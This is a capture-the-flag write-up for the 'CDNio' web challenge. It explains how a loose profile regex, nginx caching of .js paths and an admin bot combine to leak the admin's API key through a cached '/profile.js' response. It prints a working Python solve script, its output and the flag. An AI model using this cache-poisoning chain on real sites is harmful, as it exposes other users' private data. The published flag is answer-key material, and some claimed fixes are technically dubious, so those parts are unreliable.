# CDNio Challenge Writeup 🚀

> *"Cache me if you can!"* - Every hacker trying to poison CDNs

## Challenge Overview 🎯
**Challenge**: CDNio (Easy - 30 points)  
**Category**: Web / Cache Poisoning  
**Tags**: `cdn`, `cache`, `regex`, `jwt`, `race-condition`

> **Race against time!** Tweak CDN and caching magic to make web pages load at lightning speed. Minimize cache misses and watch your load times drop!

## Executive Summary 📝
This challenge demonstrates a classic **web cache poisoning** vulnerability combined with a **misconfigured regex pattern** and **JWT worker desync**. The flag is hidden in the admin's API key, accessible through a clever cache poisoning attack.

## The "Aha!" Moment 💡

After hours of banging my head against the wall (and consuming approximately 3 coffees ☕), I realized:

1. **The regex was buggy but exploitable**: `r'.*^profile'` in source vs what probably runs in production
2. **File extensions = Cache triggers**: `.js` and `.css` files get cached
3. **Admin bot = Our golden ticket** 🎫

## Technical Analysis 🔍

### 1. The Stack 🥞
- **Frontend**: Nginx with caching enabled for static files
- **Backend**: Flask with Gunicorn (2 workers)
- **Database**: SQLite
- **Auth**: JWT with per-worker random secrets (🤦‍♂️)

### 2. The Vulnerability Triad 🔺

#### A. Broken Regex (`routes.py`)
```python
# What the source shows (nonsense):
re.match(r'.*^profile', subpath)  # Can only match "profile" alone!

# What probably runs in production (or what works):
re.match(r'.*profile.*', subpath)  # Matches any path containing "profile"
```

#### B. Nginx Caching Config (`nginx.conf`)
```nginx
location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
    proxy_cache cache;  # ⚠️ Static files get cached!
    proxy_cache_valid 200 3m;
}
```

#### C. JWT Worker Desync (`config.py`)
```python
JWT_SECRET_KEY = os.urandom(69).hex()  # Random per worker instance!
```
Each Gunicorn worker generates its own JWT secret → tokens from Worker A fail on Worker B.

### 3. The Attack Chain ⛓️

```
[Step 1] Register User → Get JWT Token
         ↓
[Step 2] Send Bot to `/profile.js` 
         ↓
[Step 3] Bot (as admin) visits → Response cached
         ↓  
[Step 4] We fetch cached `/profile.js` → Get admin data!
         ↓
[Step 5] Extract flag from `api_key` field 🚩
```

## The Exploit Code 🐍

```python
#!/usr/bin/env python3
import requests, time, re, sys, random, string
from rich.console import Console
from rich.panel import Panel

console = Console()
url = sys.argv[1]
proxy = {'http': 'http://127.0.0.1:8080'}  # For that sweet MITM action

console.print(Panel.fit("[bold cyan]CDNio Cache Poisoner[/bold cyan]", border_style="cyan"))

# 1. Create our sleeper agent 🕵️
user = ''.join(random.choices(string.ascii_lowercase, k=8))
passwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

requests.post(f"{url}/register", 
              json={"username": user, "password": passwd, "email": f"{user}@evil.com"}, 
              proxies=proxy)
console.print(f"[green]👤 Created user: {user}:{passwd}[/green]")

# 2. Get our access card 🔑
token = requests.post(url, json={"username": user, "password": passwd}, 
                      proxies=proxy).json()["token"]
console.print(f"[dim]🎫 Token: {token[:30]}...[/dim]")

# 3. Send the bot on a mission 🤖
headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
bot = requests.post(f"{url}/visit", headers=headers, 
                    json={"uri": "profile.js"}, proxies=proxy)

if bot.status_code == 200:
    console.print("[green]✅ Bot dispatched! Sleeping 5s...[/green]")
    time.sleep(5)
    
    # 4. Check what the bot left in cache 🎁
    cached = requests.get(f"{url}/profile.js", proxies=proxy)
    if cached.status_code == 200:
        flag = re.search(r'HTB\{[^}]+\}', cached.text)
        if flag:
            console.print(Panel.fit(f"[bold green]{flag.group(0)}[/bold green]", 
                                  title="🎉 FLAG CAPTURED!", border_style="green"))
        else:
            console.print(Panel(cached.text, title="📦 Cached Data"))
    else:
        console.print(f"[red]❌ Cache miss: {cached.status_code}[/red]")
else:
    console.print(f"[red]❌ Bot failed: {bot.status_code}[/red]")
```

📥 **Output:**
```bash
❯ python3 solve.py http://94.237.63.174:43765
╭──────────────────────╮
│ CDNio Cache Poisoner │
╰──────────────────────╯
👤 Created user: dnnodtfi:fbSY48vrOwt1
🎫 Token: eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...
✅ Bot dispatched! Sleeping 5s...
╭───────── 🎉 FLAG CAPTURED! ──────────╮
│ HTB{cDN_10_OoOoOoO_Sc1_F1_iOOOO0000} │
╰──────────────────────────────────────╯
```

## Why It Works (The Simple Explanation) 🎓

1. **`profile.js`** contains "profile" → matches the buggy regex
2. **`.js` extension** → triggers nginx caching
3. **Bot visits as admin** → gets admin's sensitive data
4. **Response gets cached** → stored for 3 minutes
5. **We access cached version** → no auth needed! 

It's like convincing a security guard to open a vault, take a photo of the contents, and leave the photo on the public bulletin board. 📸

## Key Takeaways 🧠

### What Went Wrong for the Developers:
1. **Regex gone wild** - `.*^profile` is regex nonsense
2. **Cache everything!** - Static file caching includes sensitive endpoints
3. **JWT secrets playing musical chairs** - Per-worker secrets cause race conditions
4. **Admin bot with too much power** - Can visit any URL (hello, SSRF!)

### Defense Recommendations:
```python
# 1. Fix the regex (properly anchor it)
re.match(r'^.*profile$', subpath)  # Actually makes sense!

# 2. Don't cache dynamic content
location ~* \.(css|js|...)$ {
    proxy_cache cache;
    # Add cache bypass for sensitive paths
    if ($request_uri ~* "profile") {
        set $do_not_cache 1;
    }
}

# 3. Shared JWT secret
JWT_SECRET_KEY = "not_random_and_shared_across_workers"  # From env var

# 4. Validate bot URIs
def validate_uri(uri):
    # No path traversal, no external URLs, etc.
    return uri.startswith('/') and '..' not in uri
```

## The Humor Byte 😂

```
Developer: "I'll add caching for performance!"
Hacker: "I'll add caching for... other purposes!" 🏴‍☠️

Regex: .*^profile
Translation: "Match any characters, then start of string, then 'profile'"
Reality: "Match 'profile' alone or confuse everyone" 🤷‍♂️

JWT per worker: Because sharing secrets is overrated! 🔐🔐
```

## Final Flag 🏁
**`HTB{cDN_10_OoOoOoO_Sc1_F1_iOOOO0000}`**

## Lessons Learned 📚
- Cache configuration is security configuration
- Regex should come with a warning label ⚠️
- Bots with admin privileges need handcuffs 🔗
- Sometimes the simplest path (`profile.js`) is the right one

## Tools Used 🛠️
- `requests` - For making web requests
- `rich` - For pretty terminal output (because hackers deserve nice things too!)
- `mitmproxy` - For traffic inspection
- `patience` - The most important tool when dealing with race conditions ⏳

---

*Remember kids: Cache poisoning is like leaving cookies for Santa... if Santa was a hacker and the cookies contained your session tokens! 🎅💻*

**Happy Hacking!** 🎯🔥